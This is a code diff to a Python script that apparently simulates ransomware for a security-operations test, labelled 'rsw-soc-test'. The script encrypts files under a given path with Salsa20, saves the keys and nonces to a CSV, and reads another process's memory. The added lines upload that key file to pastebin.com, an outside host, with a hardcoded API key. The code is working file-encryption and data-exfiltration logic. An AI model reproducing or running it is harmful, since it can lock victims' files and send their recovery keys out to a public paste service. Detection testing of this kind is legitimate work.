@@ -3,6 +3,8 @@ import sys
 import csv
 import time
 import psutil
+import urllib.request
+import urllib.parse
 import getopt
 import binascii
 import win32api
@@ -12,6 +14,8 @@ from fileinput import close
 from random import randbytes
 from ctypes import wintypes as w
 from Cryptodome.Cipher import Salsa20
+
+params = {}
 
 
 def get_filepaths(directory):
@@ -67,7 +71,7 @@ def encrypt_files_in_path(argv):
             print("Encrypted:")
             print("\tFilename:{}\n\tKey:{}\n\tNonce:{}\n".format(f, key, nonce))
             writer.writerow([f, key, nonce])
-    print("\tDecryption information was saved in {}\n".format(csv_file))
+    print("\tDecryption information was saved in {}\n".format(csv_file.name))
     csv_file.close()
 
 
@@ -123,7 +127,8 @@ def read_process_memory_test():
     buffer = c.create_string_buffer(strlen)
     size = c.c_size_t()
     if k32.ReadProcessMemory(process_handle, process_header_addr, buffer, strlen, c.byref(size)):
-        print("\tTEST_2: READ PROCESS MEMORY RESULT:\t\t\nSTRLEN: {}\t\t\nBINARY OUTPUT: {}".format(size.value, buffer.raw))
+        print("\tTEST_2: READ PROCESS MEMORY RESULT:\n\t\tSTRLEN: {}\n\t\tBINARY OUTPUT: {}".format(size.value,
+                                                                                                    buffer.raw))
         close_handle(process_handle)
 
     else:
@@ -131,14 +136,47 @@ def read_process_memory_test():
         close_handle(process_handle)
 
 
+def load_file_to_pastebin(filename):
+    try:
+        with open(filename, 'r') as content:
+            file_content = content.read()
+        return file_content
+    except IOError:
+        print("Error: File doesn't exist")
+        sys.exit(2)
+
+
+def send_request(file_content, paste_name="Untitled", paste_expiration="1M", paste_syntax="text"):
+    params['api_dev_key'] = 'LOaqlprZFvpav4CqpAjljvTajh3bTmR7'
+    params['api_paste_private'] = '0'
+    params['api_user_key'] = ''
+    params['api_paste_code'] = load_file_to_pastebin(file_content)
+    params['api_option'] = 'paste'
+    params['api_paste_format'] = paste_syntax
+    params['api_paste_expire_date'] = paste_expiration
+    params['api_paste_name'] = paste_name
+
+    try:
+        response = urllib.request.urlopen('https://pastebin.com/api/api_post.php',
+                                          urllib.parse.urlencode(params).encode('utf-8'))
+        url = response.read()
+        return url
+    except KeyboardInterrupt:
+        print("Application interrupted by keyboard")
+        sys.exit(0)
+
+
 def main(argv):
     path_to_programm = r"C:\Windows\System32\notepad.exe"
-    print("TEST_1: Crypting files in {}\n".format(argv))
+    print("TEST_1: Crypting files in {}\n".format(argv[1]))
     encrypt_files_in_path(argv)
     print("TEST_2: Read process memory from {}".format(path_to_programm))
     os.startfile(path_to_programm)
     time.sleep(1)
     read_process_memory_test()
+    url = send_request('./decrypt_data.csv', 'rsw-soc-test', '1H', 'text')
+    print("Decrypt info was send to server.\n"
+          "download link: {}".format(url.decode()))
 
 
 if __name__ == "__main__":
